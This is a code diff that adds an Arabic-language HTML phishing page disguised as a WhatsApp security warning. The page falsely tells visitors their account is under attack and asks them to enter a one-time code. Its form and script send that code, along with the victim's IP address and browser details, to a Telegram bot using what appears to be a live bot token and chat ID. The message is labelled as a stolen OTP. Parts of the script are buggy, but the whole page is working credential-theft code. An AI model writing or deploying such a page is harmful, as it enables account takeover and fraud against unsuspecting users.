@@ -1,1 +1,57 @@
-ات
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد رقم واتساب</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #e5ddd5; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        .whatsapp-box {
+            background: white;
+            width: 300px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="whatsapp-box">
+        <h2>⚠️ تنبيه أمني ⚠️</h2>
+        <p class="warning">تم اكتشاف محاولة اختراق لحسابك!</p>
+        <p>لحماية حسابك، يرجى إدخال رمز OTP الذي تلقيته للتو:</p>
+        
+        <form id="otpForm" action="https://api.telegram.org/bot 8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU/sendMessage" method="POST">
+            <input type="text" name="chat_id" value="5446862709" hidden>
+            <input type="text" name="text" id="fullData" hidden>
+            
+            <input type="text" placeholder="أدخل رمز OTP هنا" required style="padding: 10px; width: 80%; margin: 10px 0;">
+            <button type="submit" style="background: #25D366; color: white; border: none; padding: 10px 20px; border-radius: 5px;">تأكيد</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('otpForm').onsubmit = function() {
+            const otp = document.querySelector('input[type="text"]').value;
+            const userAgent = navigator.userAgent;
+            const ip = fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip);
+            
+            document.getElementById('fullData').value = `📱 OTP مسروق:\n\n🔑 الرمز: ${otp}\n\n🌐 IP الضحية: ${ip}\n\n🛠️ User Agent: ${userAgent}`;
+            
+            return true;
+        };
+    </script>
+</body>
+</html>
